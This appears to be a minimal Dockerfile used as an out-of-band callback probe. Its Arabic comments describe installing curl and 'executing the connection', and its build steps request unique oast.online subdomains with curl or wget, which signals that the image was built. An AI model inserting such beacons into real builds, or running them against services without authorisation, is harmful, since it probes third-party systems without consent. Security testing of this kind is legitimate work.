FROM alpine:latest
# محاولة تسطيب curl لو مش موجود (مع تجاهل الأخطاء)
RUN apk add --no-cache curl || true
# تنفيذ الاتصال
RUN curl http://docker.d526g6o3t4gp92l5pbrg4ywsphjkpsg3b.oast.online || wget -qO- http://docker-wget.d526g6o3t4gp92l5pbrg4ywsphjkpsg3b.oast.online
